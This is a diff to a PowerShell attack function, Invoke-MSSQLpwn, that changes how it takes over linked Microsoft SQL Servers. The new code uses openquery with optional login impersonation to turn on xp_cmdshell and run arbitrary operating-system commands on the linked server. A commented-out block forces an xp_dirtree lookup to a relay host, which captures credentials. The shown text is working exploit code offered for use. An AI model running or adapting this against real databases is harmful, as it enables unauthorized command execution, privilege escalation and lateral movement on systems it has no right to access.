@@ -266,11 +266,6 @@ Function Invoke-MSSQLpwn{
         }
         $sqlCmd = New-Object System.Data.SqlClient.SqlCommand
         $sqlCmd.Connection = $sqlConnection
-        if ($PSBoundParameters.ContainsKey('Impersonate')){
-            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
-            $reader = $sqlCmd.ExecuteReader()
-            $reader.Close()
-        }
         <#
         if ($PSBoundParameters.ContainsKey('Relay')){
             $sqlCmd.CommandText = "EXEC ('master..xp_dirtree ''\\\$Relay\\\test''') AT '$Link';"
@@ -281,17 +276,28 @@ Function Invoke-MSSQLpwn{
         }
         #>
         if ($Mode -eq 2){
-
         } else {
-            $sqlCmd.CommandText = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT '$Link';";
+            if ($PSBoundParameters.ContainsKey('Impersonate')){
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
+            }else {
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link
+            }
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
 
-            $sqlCmd.CommandText = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT '$Link'"
+            if ($PSBoundParameters.ContainsKey('Impersonate')){
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
+            }else {
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link
+            }
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
 
-            $sqlCmd.CommandText = "EXEC ('xp_cmdshell ''{0}'';') AT '$Link'" -f $Command;
+            if ($PSBoundParameters.ContainsKey('Impersonate')){
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC xp_cmdshell ''''{2}'''';'')' -f $Link,$LinkImpersonate,$Command
+            }else {
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC xp_cmdshell ''''{1}'''';'')' -f $Link,$Command
+            }
             $reader = $sqlCmd.ExecuteReader()
             while ($reader.Read()){
                 $reader[0]
